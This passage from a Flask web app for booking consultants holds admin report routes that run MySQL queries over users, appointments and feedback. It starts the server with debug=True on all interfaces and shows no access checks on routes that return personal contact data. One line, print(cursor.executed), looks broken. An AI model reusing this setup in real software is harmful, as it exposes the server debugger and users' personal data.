	sqldt = (request.form['name'],request.form['emailid'],request.form['mno'],request.form['gender'],request.form['dob'],session['email'])
	print(cursor.executed)
	cursor.execute(sql,sqldt)
	connection.commit()
	return "personal_details_userscr"

# USER END

@app.route('/reports/')
def reports():
	cursor = connection.cursor()
	sql = "Select * from user_master where UTMID = %s or UTMID = %s"
	sqldt = (3,4)
	cursor.execute(sql,sqldt)
	# print(cursor._executed)
	data = cursor.fetchall()

	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	reports.data = data
	# print(data)
	return render_template("reports.html",data=data)

@app.route('/Profession_Reports/')
def Profession_Reports():
	cursor = connection.cursor()
	sql = ''' /*Most booked consultant::*/
SELECT
    user_master.Name as "Full Name",
    COUNT(appointment_master.UID) AS "No of Appointments",
    profession_type.Profession_Type AS "Profession"
FROM
    appointment_master
INNER JOIN consultant_master ON appointment_master.CID = consultant_master.CID
INNER JOIN profession_master ON profession_master.CID = consultant_master.CID
INNER JOIN user_master ON consultant_master.UID = user_master.UID
INNER JOIN profession_type ON profession_type.Profession_Type_ID = profession_master.Profession_Type_ID
	GROUP BY
    consultant_master.CID'''
	cursor.execute(sql)
	data = cursor.fetchall()

	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	reports.data = data
	return render_template('admin/Profession_Reports.html',data = data,now = datetime.now())

@app.route('/Area_Profession_Reports/')
def Area_Profession_Reports():
	cursor = connection.cursor()
	sql = "SELECT DISTINCT(area) from consultant_master"
	cursor.execute(sql)
	data = cursor.fetchall()
	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	area = results	
	Area_Profession_Reports.area = area

	sql = "select DISTINCT(city) from consultant_master"
	cursor.execute(sql)
	data = cursor.fetchall()
	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	city = results
	Area_Profession_Reports.city = city

	sql = "select DISTINCT(state) from consultant_master"
	cursor.execute(sql)
	data = cursor.fetchall()
	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	state = results	
	Area_Profession_Reports.state = state		
	return render_template("admin/Area_Profession_Reports.html.j2",area=Area_Profession_Reports.area,city=Area_Profession_Reports.city,state=Area_Profession_Reports.state)

@app.route('/Area_Profession_Reportsscr/',methods=['post'])
def Area_Profession_Reportsscr():
	cursor = connection.cursor()
	sql ='''
	-- Area Wise Consultant Records
SELECT
    user_master.Name,
    user_master.Email_ID,
    user_master.Phone_No,
    user_master.Gender
FROM
    user_master
INNER JOIN consultant_master ON consultant_master.UID = user_master.UID
INNER JOIN profession_master ON profession_master.CID = consultant_master.CID
where consultant_master.Area like %s or consultant_master.City like %s OR consultant_master.State LIKE %s
	'''
	sqldt =(request.form['area'],request.form['city'],request.form['state'])
	cursor.execute(sql,sqldt)
	data = cursor.fetchall()
	print(cursor._executed)
	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	return render_template('admin/Area_Profession_Reports.html.j2',data=data,area=Area_Profession_Reports.area,city=Area_Profession_Reports.city,state=Area_Profession_Reports.state,now = datetime.now())

@app.route('/Date_Profession_Reports/')
def Date_Profession_Reports():
	cursor = connection.cursor()
	sql = "SELECT MIN(appointment_master.Date) as min,Max(appointment_master.Date) as max FROM appointment_master"
	cursor.execute(sql)
	data = cursor.fetchall()
	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	Date_Profession_Reports.data = data
	return render_template('admin/Date_Profession_Reports.htm.j2',data=Date_Profession_Reports.data)


@app.route('/Date_Profession_Reportsscr/',methods=['POST'])
def Date_Profession_Reportsscr():
	cursor = connection.cursor()
	sql='''
		SELECT
    user_master.Name,
    COUNT(appointment_master.Time) as "Time",
    profession_type.Profession_Type
FROM
    appointment_master
INNER JOIN consultant_master ON appointment_master.CID = consultant_master.CID
INNER JOIN user_master ON user_master.UID = consultant_master.UID
INNER join profession_master on profession_master.CID = consultant_master.CID
INNER JOIN profession_type ON profession_type.Profession_Type_ID = profession_master.Profession_Type_ID
WHERE
    appointment_master.Date BETWEEN %s AND %s
    Group by appointment_master.CID
	'''
	sqldt = (request.form['min'],request.form['max'])
	cursor.execute(sql,sqldt)
	print(cursor._executed)
	data = cursor.fetchall()
	# columns = [column[0] for column in cursor.description]
	# results = []
	# for row in data:
	# 	results.append(dict(zip(columns, row)))
	# data = results
	return render_template("admin/Date_Profession_Reports.htm.j2",report_data=data,data=Date_Profession_Reports.data,now = datetime.now())

@app.route('/Experience_Profession_Reports/')
def Experience_Profession_Reports():
	cursor = connection.cursor()
	sql='''SELECT
    user_master.Name,
    user_master.Email_ID,
    profession_master.Experience,
    profession_type.Profession_Type
FROM
    user_master
INNER JOIN consultant_master ON user_master.UID = consultant_master.UID
INNER JOIN profession_master ON profession_master.CID = consultant_master.CID
INNER JOIN profession_type ON profession_type.Profession_Type_ID =  profession_master.Profession_Type_ID  
ORDER BY profession_master.Experience+0  DESC'''
	cursor.execute(sql)
	data = cursor.fetchall()

	return render_template("admin/Experience_Profession_Reports.htm.j2",data=data,now = datetime.now())

@app.route('/Feedback/')
def Feedback():
	cursor = connection.cursor()
	sql = ''' 
		SELECT
    user_master.Name,
    AVG(feedback_master.Ratings) AS "Ratings",
    COUNT(feedback_master.Ratings) AS "No of Reviews"
FROM
    feedback_master
INNER JOIN user_master ON feedback_master.UID = user_master.UID
GROUP BY
    user_master.Name
	'''
	cursor.execute(sql)
	data = cursor.fetchall()
	return render_template('admin/Feedback_Wise.htm.j2',data=data,now = datetime.now())

@app.route('/Area_Profession_Specialization_Reports/')
def Area_Profession_Specialization_Reports():
	cursor = connection.cursor()
	sql = "SELECT DISTINCT(city) from consultant_master"
	cursor.execute(sql)
	area = cursor.fetchall()
	Area_Profession_Specialization_Reports.area = area

	sql = "select DISTINCT(Profession_Type) from profession_type"
	cursor.execute(sql)
	Area_Profession_Specialization_Reports.profession_type = cursor.fetchall()
	
	sql = "SELECT `Details` FROM profession_details WHERE `Type` LIKE '%specialization%' "
	cursor.execute(sql)
	Area_Profession_Specialization_Reports.specialization = cursor.fetchall()
	return render_template("admin/Area_Profession_Specialization_Reports.htm.j2",area= Area_Profession_Specialization_Reports.area,profession_type = Area_Profession_Specialization_Reports.profession_type,specialization = Area_Profession_Specialization_Reports.specialization)

@app.route('/Area_Profession_Specialization_Reportsscr/',methods=['POST'])
def Area_Profession_Specialization_Reportsscr():
	cursor = connection.cursor()
	sql = '''
	SELECT
    user_master.Name,
    user_master.Email_ID,
    consultant_master.City,
    profession_type.Profession_Type
FROM
    user_master
INNER JOIN consultant_master ON user_master.UID = consultant_master.UID
INNER JOIN profession_master ON profession_master.CID = consultant_master.CID
INNER JOIN profession_type ON profession_type.Profession_Type_ID = profession_master.Profession_Type_ID
INNER JOIN profession_details ON profession_details.Profession_Type_ID = profession_master.Profession_Type_ID
WHERE
    profession_details.Details LIKE %s AND consultant_master.City LIKE %s AND profession_type.Profession_Type LIKE %s '''
	sqldt = (request.form['specialization'],request.form['area'],request.form['profession_type'])
	cursor.execute(sql,sqldt)
	print(cursor._executed)
	data = cursor.fetchall()
	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	return render_template("admin/Area_Profession_Specialization_Reports.htm.j2",data=data,area= Area_Profession_Specialization_Reports.area,profession_type = Area_Profession_Specialization_Reports.profession_type,specialization = Area_Profession_Specialization_Reports.specialization,now = datetime.now())

@app.route('/Area_Profession_Qualification_Reports/')
def Area_Profession_Qualification_Reports():
	cursor = connection.cursor()
	sql = "SELECT DISTINCT(city) from consultant_master"
	cursor.execute(sql)
	Area_Profession_Qualification_Reports.area = cursor.fetchall()
	
	sql = "select DISTINCT(Profession_Type) from profession_type"
	cursor.execute(sql)
	Area_Profession_Qualification_Reports.profession_type = cursor.fetchall()
	
	sql = "SELECT `Details` FROM profession_details WHERE `Type` LIKE '%specialization%' "
	cursor.execute(sql)
	Area_Profession_Qualification_Reports.specialization = cursor.fetchall()
	return render_template("admin/apqr.htm.j2",area =Area_Profession_Qualification_Reports.area,profession_type=Area_Profession_Qualification_Reports.profession_type,specialization = Area_Profession_Qualification_Reports.specialization )

@app.route('/apqrscr/',methods=['POST'])
def apqrscr():
	cursor = connection.cursor()
	sql = "SELECT user_master.Name, user_master.Email_ID, consultant_master.City, profession_type.Profession_Type, profession_master.Experience FROM user_master INNER JOIN consultant_master ON user_master.UID = consultant_master.UID INNER JOIN profession_master ON profession_master.CID = consultant_master.CID INNER JOIN profession_type ON profession_type.Profession_Type_ID = profession_master.Profession_Type_ID INNER JOIN profession_details ON profession_details.Profession_Type_ID = profession_master.Profession_Type_ID WHERE profession_details.Details LIKE %s AND consultant_master.City LIKE %s AND profession_type.Profession_Type LIKE %s ORDER BY `profession_master`.`Experience` DESC"
	sqldt = (request.form['specialization'],request.form['area'],request.form['profession_type']) 
	cursor.execute(sql,sqldt)
	# print(cursor._executed)
	data = cursor.fetchall()
	return render_template("admin/apqr.htm.j2",data=data,area =Area_Profession_Qualification_Reports.area,profession_type=Area_Profession_Qualification_Reports.profession_type,specialization = Area_Profession_Qualification_Reports.specialization )

@app.route('/rcomplaint/')
def rcomplaint():
	return render_template("complaint_cons.html")

app.jinja_env.cache = {}
if __name__ == '__main__':
	app.run(host='0.0.0.0',port='3030',debug = True)
	
